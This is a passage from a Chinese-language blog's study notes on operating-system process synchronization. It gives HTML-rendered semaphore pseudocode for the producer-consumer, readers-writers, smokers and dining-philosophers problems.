class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 将该进程加入到消息队列中，进行自我阻塞&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 进程使用完资源后，通过 signal 原语释放&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;signal&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;semaphore S&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    S&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;S&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token operator&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;wakeup&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;S&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;L&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;除非特别说明，否则默认 S 为记录型信号量&lt;/p&gt;
&lt;h2 id=&#34;信号量机制总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#信号量机制总结&#34;&gt;#&lt;/a&gt; 信号量机制总结&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230726184336295.png&#34; alt=&#34;image-20230726184336295&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;23_5-用信号量机制实现进程互斥-同步-前驱关系&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_5-用信号量机制实现进程互斥-同步-前驱关系&#34;&gt;#&lt;/a&gt; 2.3_5 用信号量机制实现进程互斥、同步、前驱关系&lt;/h3&gt;
&lt;p&gt;1、实现进程互斥&lt;/p&gt;
&lt;p&gt;设置互斥信号量 mutex，初值为 1&lt;/p&gt;
&lt;p&gt;对不同的临界资源需要设置不同的互斥信号量&lt;/p&gt;
&lt;p&gt;PV 必须成对出现&lt;/p&gt;
&lt;p&gt;2、实现进程同步&lt;/p&gt;
&lt;p&gt;保证一前一后的操作顺序&lt;/p&gt;
&lt;p&gt;设置同步信号量 S，初始为 0&lt;/p&gt;
&lt;p&gt;在 “前操作” 之后执行 V（S）&lt;/p&gt;
&lt;p&gt;在 “后操作” 之后执行 P (S）&lt;/p&gt;
&lt;p&gt;3、实现进程的前驱关系&lt;/p&gt;
&lt;p&gt;1、要为每一对前驱关系各设置一个同步变量&lt;/p&gt;
&lt;p&gt;2、在 “前操作” 之后对相应的同步变量执行 V 操作&lt;/p&gt;
&lt;p&gt;3、在 “后操作” 之前对相应的同步变量执行 P 操作&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/e03e2a2147ac136fc5b50074b89844e8.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;信号量机制实现进程互斥-同步-前驱关系总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#信号量机制实现进程互斥-同步-前驱关系总结&#34;&gt;#&lt;/a&gt; 信号量机制实现进程互斥 同步 前驱关系总结&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230726215527536.png&#34; alt=&#34;image-20230726215527536&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;23_6-生产者-消费者问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_6-生产者-消费者问题&#34;&gt;#&lt;/a&gt; 2.3_6 生产者 - 消费者问题&lt;/h3&gt;
&lt;p&gt;（好像很幼稚的逻辑&lt;/p&gt;
&lt;p&gt;只有缓冲区没满时，生产者才能把产品放入缓冲区，否则必须等待&lt;/p&gt;
&lt;p&gt;只有缓冲区不空时，消费者才能从中取出产品，否则必须等待&lt;/p&gt;
&lt;p&gt;缓冲区是临界资源，各个进程互斥访问&lt;/p&gt;
&lt;p&gt;实现互斥的 P 操作要放在实现同步的 P 操作之后，不然会发生死锁&lt;/p&gt;
&lt;p&gt;V 操作不会导致进程发生阻塞的状态，所以可以交换&lt;/p&gt;
&lt;p&gt;使用操作不要放在临界区，不然并发度会降低&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230726222000937.png&#34; alt=&#34;image-20230726222000937&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;23_7-多生产者-多消费者模型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_7-多生产者-多消费者模型&#34;&gt;#&lt;/a&gt; 2.3_7 多生产者 - 多消费者模型&lt;/h3&gt;
&lt;p&gt;在生产 - 消费者问题中，如果缓冲区大小为 1，那么有可能不需要设置互斥信号量就可以实现互斥访问缓冲区&lt;/p&gt;
&lt;p&gt;分析同步问题是，应该从 “事件” 的角度来考虑&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230727131356061.png&#34; alt=&#34;image-20230727131356061&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/68b1e50aeeabfa85ad0126a7176deb5c.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230727131411402.png&#34; alt=&#34;image-20230727131411402&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;23_8-吸烟者问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_8-吸烟者问题&#34;&gt;#&lt;/a&gt; 2.3_8 吸烟者问题&lt;/h3&gt;
&lt;p&gt;解决 “可以让生产多个产品的单生产者” 问题提供一个思路；&lt;/p&gt;
&lt;p&gt;若一个生产者要生产多种产品（或者说会引发多种前驱事件），那么各个 V 操作应该放在各自对应的 “事件” 发生之后的位置&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230727134326556.png&#34; alt=&#34;image-20230727134326556&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/40dc9cd7ea6625ed2be56e75b637ec5d.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;23_9-读者-写者问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_9-读者-写者问题&#34;&gt;#&lt;/a&gt; 2.3_9 读者 - 写者问题&lt;/h3&gt;
&lt;p&gt;1、允许多个读者同时对文件执行读操作&lt;/p&gt;
&lt;p&gt;2、只允许一个写者往文件中写信息&lt;/p&gt;
&lt;p&gt;3、任一写者在完成写操作之前不允许其他读者或写者工作&lt;/p&gt;
&lt;p&gt;4、写者执行写操作前，应让已有的读者和写者全部退出&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;semaphore rw&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 用于实现对文件的互斥访问。表示当前是否有进程在访问共享文件&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; count&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 记录当前有几个读进程在访问文件&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;semaphore mutex&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 用于保证对 count 变量的互斥访问&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;semaphore w&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 用于实现 “写优先”&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;writer&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        P（w）&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 写之前 “加锁”&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        写文件。。。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        V（rw&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 写之后 “解锁”&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    	&lt;span class=&#34;token function&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;reader&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	    &lt;span class=&#34;token function&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mutex&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;// 各读进程互斥访问 count&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;count&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token function&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 第一个读进程的读进程数 + 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        count&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;	&lt;span class=&#34;token comment&#34;&gt;// 访问文件的读进程数 + 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mutex&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;	&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        读文件&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mutex&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;	&lt;span class=&#34;token comment&#34;&gt;// 各读进程互斥访问 count&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        count&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;	&lt;span class=&#34;token comment&#34;&gt;// 访问文件的读进程数 - 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;count&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token function&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;	&lt;span class=&#34;token comment&#34;&gt;// 最后一个读进程负责 “解锁”&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mutex&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;23_10-哲学家进餐问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_10-哲学家进餐问题&#34;&gt;#&lt;/a&gt; 2.3_10 哲学家进餐问题&lt;/h3&gt;
&lt;p&gt;五个人，必须拿左右的筷子才能吃饭&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230727172610642.png&#34; alt=&#34;image-20230727172610642&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230727172630279.png&#34; alt=&#34;image-20230727172630279&#34;&gt;&lt;/p&gt;
&lt;p&gt;避免死锁发生&lt;/p&gt;
&lt;p&gt;解决方案：&lt;br&gt;
1、可以对哲学家进程施加一些限制条件，比如最多允许四个哲学家同时进餐，这样可以保证至少有一个哲学家是可以拿到左右两只筷子的。&lt;/p&gt;
&lt;p&gt;2、要求奇数号哲学家先拿左边的筷子，然后再拿右边的筷子，而偶数号哲学家刚好相反。用这种方法可以保证如果相邻的两个奇偶号哲学家都想吃饭，那么只会有其中一个可以拿起第一只筷子，另一个会直接阻塞。这就避免了占有一只后再等待另一只的情况。&lt;/p&gt;
&lt;p&gt;3、仅当一个哲学家左右两只筷子都可用时才允许他抓起筷子。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;semaphore chopstick&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;semaphore mutex &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 互斥地取筷子&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Pi&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;				 &lt;span class=&#34;token comment&#34;&gt;//i 号哲学家的进程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mutex&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;chopstick&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;      &lt;span class=&#34;token comment&#34;&gt;// 拿右&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;chopstick&lt;span class=&#34;token 